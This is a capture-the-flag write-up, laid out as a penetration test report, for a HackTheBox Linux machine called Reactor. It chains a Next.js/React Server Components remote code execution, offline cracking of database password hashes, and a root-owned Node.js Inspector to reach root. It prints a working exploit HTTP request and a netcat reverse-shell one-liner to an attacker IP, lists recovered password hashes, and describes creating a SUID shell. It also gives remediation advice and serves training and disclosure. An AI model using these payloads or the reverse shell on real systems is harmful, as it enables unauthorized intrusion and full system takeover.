# 🎯 Machine Information

---
# 📋 General Information

| Field               | Value       |
| ------------------- | ----------- |
| 🖥️ Machine         | Reactor     |
| 🌍 Platform         | HTB         |
| 💻 Operating System | Linux       |
| 🎯 Difficulty       | Easy        |
| 📅 Date Started     | 27/Ago/2026 |
| 📅 Date Finished    | 28/Ago/2026 |
| 👤 Author           |  tejas3008  |

---
# 📄 Executive Summary

>Between **27 August 2026 and 28 August 2026**, a **black-box penetration test** was conducted against the **Reactor** environment, with the objective of identifying vulnerabilities that could allow unauthorized access, remote code execution, privilege escalation, or full compromise of the target system.

 **Overall Risk Rating: 🔴 Critical**
  
> The overall risk to the Reactor environment is assessed as **Critical** due to the successful exploitation of a pre-authentication remote code execution vulnerability, followed by local credential discovery and privilege escalation to **root**. The initial compromise was achieved by identifying **Next.js 15.0.3** on the exposed web application and subsequently validating **CVE-2025-55182**, a critical vulnerability affecting React Server Components. Successful exploitation allowed arbitrary command execution on the underlying Linux host and resulted in an interactive shell as the `**node**` user. Following initial access, local enumeration was performed to identify additional attack paths and sensitive information. This process identified the `**reactor.db**` SQLite database, which contained password hashes associated with local application accounts. Offline password cracking resulted in the recovery of valid credentials for the `**engineer**` user, allowing authenticated SSH access to the target system. With access to the `**engineer**` account, further local privilege escalation enumeration identified a root-owned Node.js process running with the **Node.js Inspector** enabled on `127.0.0.1:9229`. Because the debugging interface did not implement authentication, the low-privileged `engineer` account was able to establish a Chrome DevTools Protocol session with the root-owned process and execute arbitrary JavaScript within its security context. This capability was leveraged to execute operating-system commands with **root privileges**, resulting in the creation of a privileged SUID shell and ultimately providing full administrative control of the target system. The attack chain demonstrated how an externally exploitable application vulnerability, insufficient protection of sensitive credentials, and an exposed privileged debugging interface could be chained to achieve complete system compromise. From a business perspective, successful exploitation could allow an attacker to execute arbitrary commands, access sensitive application and operating-system data, obtain additional user credentials, escalate privileges, establish persistence, and fully compromise the confidentiality, integrity, and availability of the affected system. **Immediate remediation is strongly recommended**, with priority given to updating the affected Next.js/React components, protecting sensitive credentials stored within application databases, and disabling the Node.js Inspector in production or restricting access to trusted administrative users only.

###   🔗 Attack Chain

---
![](assets/Web%20Access%20and%20Privilege-2026-08-29-203510.png)

---

# 🌐 Attack Surface
 
## 🛰️ Open Services

| IP            | Port | Service | Tec     | Version |
| ------------- | ---- | ------- | ------- | ------- |
| 10.129.97.238 |      |         |         |         |
|               | 22   | ssh     | OpenSSH | 9.6     |
|               | 3000 | http    | nginx   | 1.24.0  |

---
## 🌍 Domains

| 🖥️ IP        | 🌐 Domain | 🌍 Subdomain | 📍 Status / Notes |
| :------------ | :-------- | :----------- | :---------------- |
| 10.129.70.151 | NULL      | NULL         | 200               |



---

## ⚙️ Technologies

| Domain / IP                | Technology | Version | Notes                                                          |
| -------------------------- | ---------- | ------- | -------------------------------------------------------------- |
| http://10.129.97.238:3000/ | Next.js    | 15.0.3  | Informational page with no apparent interactive functionality. 

---

# 🔍 Reconnaissance

## Enumeration Commands

```bash
nmap -p22,3000 -sCV -oN Services 10.129.97.238
```

---

## Raw Output

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## Analysis

>The scan against **10.129.97.238** identified a limited external attack surface consisting of SSH and a web application exposed on TCP port 3000.

- **SSH (22/tcp)** — OpenSSH 9.6p1 running on Ubuntu. No immediately exploitable vulnerability was identified during service enumeration, and no valid credentials were initially available. SSH was therefore deprioritized until credentials were obtained through subsequent exploitation.
- **HTTP (3000/tcp)** — The service exposed a web application running on **Next.js 15.0.3**. Technology fingerprinting identified the framework and version, which was subsequently reviewed against publicly disclosed vulnerabilities affecting Next.js and React Server Components.

>The exposed web application represented the primary attack surface and became the initial focus of vulnerability validation. Further investigation of the identified framework version resulted in the identification and successful exploitation of **CVE-2025-55182**.

---
## Evidence

📷 Screenshot
![](assets/Pasted%20image%2020260828222119.png)

---

# 🚨 Findings

## 🟣 WEB-001 —  Pre-Authentication Remote Code Execution via React Server Components (CVE-2025-55182)

### 📋 Finding Metadata

| Field         | Value                                           |
| ------------- | ----------------------------------------------- |
| Finding ID    | WEB-001                                         |
| Severity      | 🟣 CRITICAL                                     |
| Status        | Confirmed                                       |
| Domain        | null                                            |
| Endpoint      | /                                               |
| IP            | 10.129.97.238                                   |
| Service       | Next.js                                         |
| Version       | 15.0.3                                          |
| Vulnerability | Pre-Authentication Remote Code Execution        |
| CVE           | CVE-2025-55182                                  |
| CWE           | CWE-502 — Deserialization of Untrusted Data     |
| OWASP         | A08:2021 – Software and Data Integrity Failures |
| CVSS          | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H    |
| Score         | 10.0                                            |

---

### 📝 Description

>A **pre-authentication remote code execution vulnerability** was identified in the target application running **Next.js 15.0.3**. The vulnerability affects the processing of React Server Components and allows an unauthenticated remote attacker to submit specially crafted input that is improperly processed by the server, resulting in arbitrary code execution.
>
>Successful exploitation allows arbitrary JavaScript to be evaluated within the server-side application context, which can subsequently be leveraged to execute operating-system commands through Node.js functionality.
>
>During the assessment, the vulnerability was successfully exploited to establish a reverse shell on the target host, resulting in command execution as the `**node**` user.
---
### ⚠️ Risk

Successful exploitation allows an unauthenticated remote attacker to:

- Execute arbitrary commands on the underlying server.
- Access application and operating-system files.
- Execute processes within the privileges of the affected application.
- Retrieve sensitive information from the host.
- Discover additional credentials and attack paths.
- Establish an initial foothold for subsequent local privilege escalation.
- Potentially achieve complete system compromise when chained with additional vulnerabilities.

---
### 🔎 Discovery

#### Evidence

![[Pasted image 20260828224324.png|473]]
#### Analysis

> Technology fingerprinting identified **Next.js version 15.0.3** as the framework used by the target application. The identified version was reviewed against publicly disclosed vulnerabilities affecting Next.js and React Server Components.
>
>This investigation identified **CVE-2025-55182**, a critical pre-authentication remote code execution vulnerability affecting applications that use React Server Components. The vulnerability was subsequently validated against the target application.
>
>**CVE-2025-66478**, which was initially tracked separately in relation to the same vulnerability, was later formally classified as a duplicate of CVE-2025-55182 and was therefore not treated as an independent finding.
---

### 🧠 Technical Analysis

>The assessment initially focused on determining whether the identified vulnerability could be exploited to achieve remote code execution against the target application. A publicly available proof of concept was reviewed to understand the exploitation requirements and assess the applicability of the vulnerability to the target environment.
>
>To independently verify the vulnerability and gain a deeper understanding of the underlying exploitation mechanism, the attack was subsequently reproduced manually. The relevant HTTP request was intercepted using **Burp Suite** and modified to include a malicious payload before being submitted to the target application.
>
>The malicious request caused the server-side React/Next.js processing chain to evaluate attacker-controlled JavaScript, which was subsequently leveraged to invoke Node.js functionality capable of executing operating-system commands.
>
>Successful exploitation resulted in arbitrary command execution on the target host and provided an interactive reverse shell running under the `node` user context.
---
### 💥 Exploitation
#### Payload

```bash
POST / HTTP/1.1
Host: 10.129.245.214
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Length: 478

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.242 4444 >/tmp/f');","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"
"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

The manual exploitation methodology and supporting technical reference are documented in **APPENDIX B**.

---
#### Expected Result

>The application should safely process untrusted React Server Component input and prevent attacker-controlled data from reaching arbitrary JavaScript or operating-system command execution primitives. Requests containing malicious serialized component data should be rejected or safely handled without executing attacker-controlled code on the server.

#### Actual Result

>The malicious request was successfully processed by the target application, resulting in arbitrary command execution on the underlying Linux host. A reverse shell was established successfully, providing interactive command execution as the `**node**` user.

---
#### Evidence
📷 Screenshot

![](assets/Pasted%20image%2020260828231749.png)

---
## 🎯 Impact

Successful exploitation of the vulnerability resulted in **pre-authentication remote code execution** on the target host.

The exploitation demonstrated the ability to::

- Execute arbitrary commands remotely without authentication.
- Establish an interactive shell as the `node` user.
- Access local application and system files available to the compromised account.
- Perform local enumeration to identify additional credentials and privilege escalation opportunities.
- Use the initial foothold as the entry point for subsequent compromise of higher-privileged accounts.

This vulnerability represented the **initial compromise of the target system** and enabled the subsequent privilege escalation chain.

---
### 🔧 Remediation

To remediate this vulnerability:

- Upgrade Next.js and the affected React Server Components dependencies to a vendor-supported version containing the security fix.
- Remove or replace vulnerable versions of the affected framework components.
- Maintain a formal software inventory and vulnerability-management process for application dependencies.
- Implement dependency monitoring to identify newly disclosed vulnerabilities affecting production components.
- Rebuild and redeploy the application after updating vulnerable dependencies.
- Review application logs for evidence of exploitation and unexpected server-side command execution.
- Validate that no unauthorized files, processes, or persistence mechanisms remain on the host following exploitation.
---

### 📚 References

-  CVE-2025-55182
- CWE-502: Deserialization of Untrusted Data
- OWASP Top 10 2021 – A08: Software and Data Integrity Failures

---
# 🔐 Credentials

| Username | Password                                    | Source     | Privilege  | Valid     |
| -------- | ------------------------------------------- | ---------- | ---------- | --------- |
| engineer | Recovered through offline password cracking | reactor.db | Local user | Confirmed |

---

# 🚪 Initial Access

## Method

>Initial access was obtained by exploiting **CVE-2025-55182**, a pre-authentication remote code execution vulnerability affecting the target's Next.js and React Server Components implementation.

>Successful exploitation resulted in an interactive reverse shell on the target host running under the privileges of the `**node**` user.

---

## Commands

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.242 4444 
```

---

## Session Information

| Field   | Value         |
| ------- | ------------- |
| User    | node          |
| Shell   | /usr/bin/bash |
| Service | Next.js       |
| Port    | 4444          |

---


# ⬆️ Privilege Escalation

## 🔴 LPE-001 - Unauthenticated Node.js Inspector Remote Code Execution Leading to Root Privilege Escalation

### 📋 Finding Metadata

| Field          | Value                                                                 |
| -------------- | --------------------------------------------------------------------- |
| Finding ID     | LPE-001                                                               |
| Severity       | 🔴 Critical                                                           |
| Status         | Confirmed                                                             |
| Host           | reactor.htb                                                           |
| Source Context | engineer                                                              |
| Target Context | root                                                                  |
| Component      | uptime-monitor.service (Node.js Inspector / Chrome DevTools Protocol) |
| Target         | /opt/uptime-monitor/worker.js                                         |
| Vulnerability  | Unauthenticated Debug Interface Exposure → Arbitrary Code Execution   |
| CVE            | N/A                                                                   |
| CWE            | CWE-306 / CWE-668                                                     |
| OWASP          | A05:2021 Security Misconfiguration                                    |
| CVSS           | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H                          |


### 📝 Description

>After obtaining valid access as the low-privileged `**engineer**` user, local privilege escalation enumeration was performed. Process enumeration identified a root-owned Node.js process associated with the `uptime-monitor.service` systemd unit and launched with the `--inspect=127.0.0.1:9229` option.
>
>This option exposed the Node.js Inspector on localhost, providing access to the Chrome DevTools Protocol (CDP). The interface did not require authentication, allowing any local user with access to `127.0.0.1:9229` to establish a debugging session with the root-owned process.
>
>Because the Node.js Inspector allows JavaScript evaluation within the context of the target process, the exposed interface effectively provided a local arbitrary code execution primitive operating with **root privileges**.

---
### 🕵️‍♂️Enumeration

```bash
ps aux | grep node
cat /etc/systemd/system/uptime-monitor.service
find /opt/uptime-monitor -writable -ls 2>/dev/null
curl http://127.0.0.1:9229/json
```
### 📜Result

```bash
root      1383  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

[Service]
Type=simple
User=root
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
Restart=on-failure
RestartSec=3

{
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/aba07e20-4253-4b4a-b265-655ff7f2c9f6"
}
```

####  Evidence

📷 Screenshot

![](assets/Pasted%20image%2020260829114036.png)

---

### 🔬 Analysis

>Enumeration of common local privilege escalation vectors, including `sudo -l`, SUID binaries, cron jobs, writable service files, and group-based escalation opportunities, did not initially reveal a directly exploitable privilege escalation path from the `engineer` account.
>
>Process enumeration subsequently revealed a root-owned Node.js process launched with the `--inspect=127.0.0.1:9229` option. This enabled the Node.js Inspector and exposed the Chrome DevTools Protocol over a local WebSocket interface.
>
>The Node.js Inspector is intended for trusted debugging and development environments. It provides functionality that allows a connected client to interact with and evaluate JavaScript within the context of the running Node.js process.
>
>Although the interface was bound to `127.0.0.1`, this restriction did not prevent local users from accessing the debugging interface. The `engineer` account was able to access the endpoint directly:

`http://127.0.0.1:9229/json`

>The endpoint returned the active debugging session and its corresponding `webSocketDebuggerUrl` without requiring authentication.
>
>Because the affected Node.js process was running as **root**, arbitrary JavaScript execution through the Inspector occurred within the security context of the root user. This allowed operating-system commands to be executed with full administrative privileges.
>
>An operational consideration during exploitation was that the WebSocket debugger UUID is dynamically generated whenever the Node.js process starts or restarts. Consequently, the current debugger URL must be retrieved from `/json` immediately before establishing the WebSocket connection rather than relying on a previously captured UUID.

---
### 💥Exploitation

>After confirming that the Node.js Inspector was accessible without authentication, a Python script was developed to automate interaction with the Chrome DevTools Protocol and execute JavaScript within the context of the root-owned Node.js process.
>
>The resulting JavaScript execution was used to invoke Node.js's `child_process` functionality and execute operating-system commands within the root security context. The exploit script is included in **APPENDIX C**.

```bash
python3 PrvscWS_js.py
/bin/bash -p
```

---
### 📜Result

>Successful interaction with the Node.js Inspector allowed arbitrary JavaScript execution within the root-owned Node.js process. The `child_process.execSync()` functionality was used to execute a command that set the SUID bit on `/bin/bash`.
>
>Executing `/bin/bash -p` subsequently provided a shell that retained the elevated effective privileges, resulting in an interactive shell with **effective UID 0**.

####  Evidence
📷 Screenshot
![](assets/Pasted%20image%2020260829114452.png)
### 🎯Impact

Successful exploitation of the exposed Node.js Inspector resulted in complete local privilege escalation from the `**engineer**` account to `**root**`.

The attacker was able to:

- Access a root-owned debugging interface without authentication.
- Execute arbitrary JavaScript within the root process.
- Execute operating-system commands with root privileges.
- Modify executable file permissions to establish a privileged execution path.
- Obtain an interactive shell with effective UID 0.
- Achieve complete administrative control of the target host.

This vulnerability represents a **complete local privilege escalation path** and, when chained with the initial remote code execution vulnerability, results in full system compromise.

---
### 🔧 Remediation

To remediate this privilege escalation vector:

- Disable the Node.js Inspector in production environments unless explicitly required.
- Remove `--inspect` and related debugging options from production systemd service definitions.
- If debugging is operationally required, restrict access to authorized administrative users and implement appropriate access controls and network restrictions.
- Never expose debugging interfaces for processes running as `root`.
- Run Node.js applications using dedicated unprivileged service accounts whenever possible.
- Apply the principle of least privilege to all application services.
- Monitor for unexpected Node.js Inspector activity and unauthorized access to local debugging interfaces.
- Review systemd service configurations for development and debugging options that may have been inadvertently carried into production.


---
## 🔴LPE-002 - Sensitive Credential Disclosure via Accessible Application Database and Offline Password Cracking

### 📋 Finding Metadata

| Field          | Value                                                                                             |
| -------------- | ------------------------------------------------------------------------------------------------- |
| Finding ID     | LPE-002                                                                                           |
| Severity       | 🔴 High                                                                                           |
| Status         | Confirmed                                                                                         |
| Host           | reactor.htb                                                                                       |
| Source Context | node                                                                                              |
| Target Context | engineer                                                                                          |
| Component      | Reactor Application                                                                               |
| Target         | /opt/reactor-app/reactor.db                                                                       |
| Vulnerability  | Sensitive Credential Disclosure via Accessible Application Database and Offline Password Cracking |
| CVE            | N/A                                                                                               |
| CWE            | CWE-22 / CWE-73                                                                                   |
| OWASP          | A07:2021 – Identification and Authentication Failures                                             |
| CVSS           | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H                                                      |
### 📝 Description

>Following initial access as the `**node**` user, local filesystem enumeration identified the Reactor application's SQLite database at `/opt/reactor-app/reactor.db`.
>
>The database contained authentication-related information associated with application accounts. Password hashes for both the `admin` and `engineer` users were successfully extracted from the database.
>
>Offline password cracking was subsequently performed against the recovered hashes. The password associated with the `engineer` account was successfully recovered and validated by establishing an SSH session to the target host.
>
>The exposure of password hashes within an accessible application database, combined with weak password protection, allowed the initial low-privileged foothold to be converted into authenticated access as another local user.
### 🕵️‍♂️ Enumeration

```bash
find / -type f \( -iname "*.db" -o -iname "*.back" -o -iname ".env" \) 2>/dev/null
```
### 📜Result
#### Evidence
📷 Screenshot
![](assets/Pasted%20image%2020260829105329.png)

---

### 🔬Analysis

>Local filesystem enumeration was performed to identify databases, backup files, environment configuration files, and other potentially sensitive application artifacts.
>
>This process identified two files of particular interest, including `**reactor.db**` and an application `.env` file.
>
>The `reactor.db` file was subsequently inspected because SQLite databases commonly contain application authentication data. Direct examination confirmed that the database contained password hashes associated with the `admin` and `engineer` accounts.
>
>The hashes were extracted for offline analysis. Password-cracking techniques were then applied to the recovered hashes, resulting in the recovery of the password associated with the `**engineer**` account.

---
### 💥 Exploitation

>The SQLite database was queried directly to retrieve the available user records:

```bash
sqlite3 reactor.db "SELECT * FROM users"
```

>The query returned two user records containing password hashes:

```bash
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

>The recovered password hash associated with the `engineer` account was subsequently subjected to offline password cracking. The plaintext password was successfully recovered and then validated by authenticating to the target through SSH.

![](assets/Pasted%20image%2020260829110548.png)

---

### 📜 Result

>Successful SSH authentication was achieved as the `**engineer**` user using the credentials recovered from the exposed application database. 
#### Evidence
📷 Screenshot
![](assets/Pasted%20image%2020260829111055.png)

### 🎯Impact

An attacker who gains access to the Reactor application database can extract password hashes associated with application accounts and attempt offline password cracking without further interaction with the application.

Successful recovery of the `engineer` password resulted in:

- Authenticated SSH access to the target host.
- Transition from the `node` application account to the `engineer` local user.
- Access to additional files and resources available to the `engineer` account.
- A more stable and interactive local foothold.
- Access to the attack surface required to exploit the subsequent Node.js Inspector privilege escalation.

This finding demonstrates the security impact of storing recoverable authentication material in an application database without sufficient protection and enforcing strong, unique credentials.

---
### 🔧 Remediation

To remediate this vulnerability:

- Ensure application databases are protected using strict filesystem permissions.
- Store databases containing authentication information outside locations accessible to compromised application processes whenever possible.
- Use modern password-hashing algorithms designed for password storage, such as Argon2id, bcrypt, or scrypt.
- Enforce strong and unique passwords for all application and operating-system accounts.
- Never reuse application credentials for local operating-system accounts.
- Restrict SSH access to authorized users and administrative networks where possible.
- Review existing password hashes and force password resets for affected accounts.
- Regularly audit application data stores for sensitive authentication material.
- Monitor for unauthorized access to application databases and credential stores.

---

# 🖥️ Post Exploitation

## 👥 Users

| **User**   | **Description**             | **Access Obtained**      |
| ---------- | --------------------------- | ------------------------ |
| `node`     | Next.js application account | Initial foothold         |
| `engineer` | Local operating-system user | Authenticated SSH access |
| `root`     | Administrative account      | Full compromise          |

---
## 🗂️Interesting Files

| **File**                                     | **Description**                                      | **Security Relevance**                   |
| -------------------------------------------- | ---------------------------------------------------- | ---------------------------------------- |
| `/opt/reactor-app/reactor.db`                | Reactor application SQLite database                  | Credential disclosure                    |
| `/opt/reactor-app/.env`                      | Application environment configuration                | Potential sensitive information          |
| `/opt/uptime-monitor/worker.js`              | Node.js application executed by a root-owned service | Privilege escalation context             |
| `/etc/systemd/system/uptime-monitor.service` | Systemd service definition                           | Root-owned Node.js process configuration |

---
## 🛡️Sensitive Information

>During post-exploitation activities, sensitive authentication information was identified within the Reactor application's data and configuration files.
>
>The `reactor.db` database contained password hashes associated with the `admin` and `engineer` accounts. The `engineer` password was successfully recovered through offline password cracking and subsequently validated through SSH authentication.
>
>No unnecessary sensitive information was intentionally modified or removed from the target during the assessment.

---
## 🕷️Persistence Opportunities

>The successful privilege escalation to `root` provided the attacker with the ability to establish persistent access through multiple operating-system mechanisms, including modification of privileged accounts, SSH authorized keys, systemd services, or scheduled tasks.
>
>During the assessment, no additional persistence mechanisms were intentionally installed beyond the temporary privilege-escalation changes required to demonstrate the vulnerability.
>
>Any artifacts introduced solely for exploitation should be removed during remediation and the affected system should be reviewed for unauthorized modifications.

---

# 📚 Lessons Learned

## ✅ What Worked

- Identifying the exposed application framework and validating its version against publicly disclosed vulnerabilities.
- Validating the identified vulnerability independently through controlled manual exploitation.
- Using a structured local enumeration process after obtaining the initial `node` foothold.
- Searching the filesystem for databases, environment files, and other potentially sensitive application artifacts.
- Inspecting the Reactor SQLite database for authentication-related information.
- Performing offline analysis of recovered password hashes.
- Reusing the recovered credentials to validate authenticated SSH access.
- Enumerating privileged processes and systemd services after obtaining the `engineer` account.
- Identifying the exposed Node.js Inspector and validating its accessibility without authentication.
- Chaining multiple vulnerabilities to demonstrate complete compromise of the target host.

---

## ❌ Mistakes

- Running a production Node.js service with the Inspector/debugging interface enabled.
- Allowing a root-owned process to expose an unauthenticated debugging interface to local users.
- Storing authentication information in an application database accessible to a compromised application context.
- Reusing credentials between application and operating-system accounts.
- Failing to sufficiently restrict the privileges of application and service processes.
- Allowing development or debugging configurations to remain enabled in a production environment.
---

## 💡 Key Takeaways

-  Publicly exposed application frameworks and their versions should be continuously monitored for newly disclosed vulnerabilities.
- A single pre-authentication RCE vulnerability can provide an attacker with the initial foothold required for complete system compromise.
- Sensitive authentication material stored within application databases must be strongly protected and inaccessible to compromised application processes.
- Passwords should be unique between applications and operating-system accounts to prevent credential reuse from enabling lateral or privilege escalation.
- Debugging interfaces such as the Node.js Inspector should never be exposed on production services running with elevated privileges.
- Privileged processes should follow the principle of least privilege and should not execute unnecessary debugging functionality.
- Effective penetration testing requires evaluating vulnerabilities as an interconnected attack chain rather than as isolated findings.
- In this assessment, the combination of **remote code execution, credential disclosure, and an unauthenticated privileged debugging interface** ultimately resulted in **full root-level compromise of the target system**.

---

# 📎 Appendix 

## 📚 Appendix A — WEB-001: Public Exploit Reference

### CVE-2025-55182 — React Server Components Remote Code Execution

>During the assessment, a publicly available security research repository was referenced to support the validation and analysis of **CVE-2025-55182**, a pre-authentication remote code execution vulnerability affecting React Server Components.

>The repository was used as a technical reference to understand the vulnerability and its exploitation requirements. The vulnerability was subsequently validated against the target application through controlled testing.

**Repository:**  
[Next.js RSC RCE Scanner — CVE-2025-66478](https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478?utm_source=chatgpt.com)

**Related Finding:** WEB-001 — Pre-Authentication Remote Code Execution via React Server Components

**CVE:** CVE-2025-55182

---
## 📚 Appendix B — WEB-001: HTTP Request Payload Reference

### Burp Suite Request — CVE-2025-55182

>The HTTP request payload used during the manual validation of **CVE-2025-55182** was based on the publicly documented exploitation technique for React Server Components.

>During the assessment, the request was intercepted and modified using **Burp Suite** before being submitted to the target application. The modified request contained attacker-controlled serialized React Server Component data designed to demonstrate arbitrary server-side code execution.

>The complete technical description of the request structure and exploitation technique is available in the following security research reference.

**Reference:**  
[CVE-2025-55182 — Remote Code Execution in React Server Components](https://www.offsec.com/blog/cve-2025-55182/?utm_source=chatgpt.com)

**Related Finding:** WEB-001 — Pre-Authentication Remote Code Execution via React Server Components

**Tool Used:** Burp Suite

---
## 📚 Appendix C — LPE-001: Node.js Inspector Exploitation Script

### PrvscWS_js.py

> The **`PrvscWS_js.py`** script was developed to automate interaction with the exposed **Node.js Inspector** through the **Chrome DevTools Protocol (CDP)**.
> 
> The script was used during the validation of **LPE-001** to establish a debugging session with the root-owned Node.js process and execute attacker-controlled JavaScript within its security context.
> 
> The complete exploitation script is available as an assessment artifact and can be accessed directly below.

**Exploitation Script:** [PrvscWS_js.py](PrvscWS_js.py)

---
# 📊 Findings Summary

| **ID**      | **Severity**    | **Vulnerability**                                                                                 | **Status** |
| ----------- | --------------- | ------------------------------------------------------------------------------------------------- | ---------- |
| **WEB-001** | 🟣 **CRITICAL** | Pre-Authentication Remote Code Execution via React Server Components (CVE-2025-55182)             | Confirmed  |
| **LPE-002** | 🔴 **HIGH**     | Sensitive Credential Disclosure via Accessible Application Database and Offline Password Cracking | Confirmed  |
| **LPE-001** | 🟣 **CRITICAL** | Unauthenticated Node.js Inspector Remote Code Execution Leading to Root Privilege Escalation      | Confirmed  |

---


# 🧠 Methodology Summary

<p align="center">
  <img src="assets/Attacker%20Recon%20to%20Privilege-2026-08-29-201644.png" alt="Attacker Recon" width="400">
</p>

